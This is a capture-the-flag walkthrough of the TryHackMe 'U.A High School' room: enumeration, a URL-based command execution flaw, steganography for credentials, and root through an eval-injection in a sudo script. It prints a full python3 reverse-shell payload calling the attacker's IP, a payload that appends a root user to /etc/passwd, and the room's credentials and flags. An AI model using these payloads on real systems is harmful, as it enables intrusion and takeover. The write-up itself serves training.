---
title: "TryHackMe - U.A High School"
date: 2025-04-01 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [ssh, gobuster, rce, cyberchef, hexeditor, dirsearch, revese shell]

---

## Reconnaissance
The first step in my approach was conducting a comprehensive Nmap scan to identify open ports and services running on the target machine:

```console
$ nmap  -sC -sV -A 10.10.109.87 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 07:47 EDT
Nmap scan report for 10.10.109.87
Host is up (0.068s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
|   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
|_  256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The scan revealed two open ports:

- 22 (SSH)
- 80 (HTTP - Apache 2.4.41)

## Directory Enumeration
Next, I used **Gobuster** to enumerate directories on the web server:
```
gobuster dir -u http://10.10.109.87 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```
Notable finding:
```terminal
/assets               (Status: 301) [Size: 313] [--> http://10.10.109.87/assets/]

```
Delving deeper:
```
gobuster dir -u http://10.10.109.87/assets -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```
Additional finding:
```
/images               (Status: 301) [Size: 320] [--> http://10.10.109.87/assets/images/]
```
## Identifying RCE Vulnerability
Switching to dirsearch:
```
dirsearch -u 10.10.109.87/assets/index.php
```

```yaml
[07:31:55] Starting: assets/index.php/                                                                      
[07:31:56] 404 -  274B  - /assets/index.php/%2e%2e//google.com              
[07:32:29] 200 -   40B  - /assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir

```
This hinted at a Remote Code Execution (RCE) vulnerability. Using [Reverse Shell Generator](https://www.revshells.com/), I crafted a reverse shell payload based on python3:

``` yaml
http://10.10.109.87/assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.9.3.99%22,8888));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27
```
This successfully granted me shell access.

## Privilege Escalation - Discovering Hidden Credentials

I proceed to the regular system shell

```console
 > script -qc /bin/bash /dev/null
```

While exploring directories, I discovered passphrase.txt:

```yaml
www-data@myheroacademia:/var/www$ ls
ls
Hidden_Content  html
www-data@myheroacademia:/var/www$ cd Hidden_Content
cd Hidden_Content
www-data@myheroacademia:/var/www/Hidden_Content$ ls
ls
passphrase.txt
www-data@myheroacademia:/var/www/Hidden_Content$ cat passphrase.txt
cat passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg==
www-data@myheroacademia:/var/www/Hidden_Content$ 
```

Decoding it via CyberChef:

![cyberchef](/images/highschoolcyber.jpg)

It is possible that this is a password. I am searching through **/etc/passwd** to identify existing users. One of them is "deku"; however, the discovered phrase does not serve as the password for this account.

Continuing to explore the machine’s directories, I came across two images. I decided to download them to my local machine.

```terminal
> wget http://10.10.242.15/assets/images/oneforall.jpg
> wget http://10.10.242.15/assets/images/yuei.jpg
```

One of the downloaded images, oneforall.jpg, appears to be corrupted.

Using hexedit in the terminal and referring to the [list of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures), I modify the initial hex values to **FF D8 FF E0 	00 10 4A 46 	49 46 00 01 	01 00 00 01**

![hexbefore](/images/hexbefore.jpg)
![hexafter](/images/hexeditafter.png)

I successfully repaired the file, and it now displays the name "deku." There is also a user account named "deku." I decided to check if there is anything else hidden within the file by using the steghide tool.

```console
> steghide extract -sf oneforall.jpg   
```

The tool prompts me for a passphrase. I enter the previously found password, **AllmightForEver!!!.**

This extracts the creds.txt file, which contains the following content:

```
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```

Using the provided credentials, I log into the deku account via SSH and successfully retrieve the first flag:

**Flag : THM{W3lC0m3_D3kU_1A_0n3f0rAll??}**

## Root Privilege Escalation

Checking sudo privileges:

```terminal
> sudo -l
```
I receive the information that:

```
User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```

I run the script.

```yaml
deku@myheroacademia:~$ sudo /opt/NewComponent/feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
test
It is This:
test
Feedback successfully saved.
```

I proceed to analyze the script's code.

```console
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi

```
The code is vulnerable to **Remote Code Execution (RCE)** due to the unsafe use of eval, which I can exploit to create a user with root privileges. To do this, I perform the following steps:

1. I create a password shortcut in the terminal.

```terminal
$ mkpasswd -m md5crypt -s
Password: 123
$1$fR9LxIOk$fQJuNrAKKyknY1PUNWs5l0                                   
```

2. I format the user information in the style of **/etc/passwd** so that it looks like this:

```
hacker:$1$MgMMCplp$bx1JXnOEyOXMkHf9VnHgK0:0:0:hacker:/root:/bin/bash
```

3. I run the **feedback.sh** script and enter the following in the prompt:

```
'hacker:$1$MgMMCplp$bx1JXnOEyOXMkHf9VnHgK0:0:0:hacker:/root:/bin/bash' >> /etc/passwd
```

4. I check if the creation of my new user was successful by reading **/etc/passwd**. As shown, I have created a new user with root privileges.

```
hacker:$1$MgMMCplp$bx1JXnOEyOXMkHf9VnHgK0:0:0:hacker:/root:/bin/bash
```

I log into the new user and search through the files to retrieve the final root flag.

```terminal
> su hacker
> find / -type f -name "root.txt" 2>/dev/null
```
I retrieve the final flag.

```console
root@myheroacademia:/opt/NewComponent# cat /root/root.txt
__   __               _               _   _                 _____ _          
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                  _    _ 
             _   _        ___    | |  | |
            | \ | | ___  /   |   | |__| | ___ _ __  ___
            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 

THM{Y0U_4r3_7h3_NUm83r_1_H3r0}

```

**Flag : THM{Y0U_4r3_7h3_NUm83r_1_H3r0}**